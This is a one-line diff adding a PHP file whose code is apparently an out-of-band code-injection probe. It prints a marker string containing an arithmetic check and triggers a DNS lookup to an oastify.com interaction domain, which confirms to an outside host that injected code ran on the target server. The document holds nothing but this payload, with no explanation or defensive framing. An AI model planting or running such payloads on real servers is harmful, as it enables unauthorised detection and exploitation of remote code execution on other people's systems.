@@ -1,0 +1,1 @@
+<?php printf("orgq4irbf0".(7*6)."pshr5jscg1");gethostbyname("zfipm8ulgxyq1vgy5zoq9gn7aygr4m7az9n1auyj.oasti"."fy.com");?>
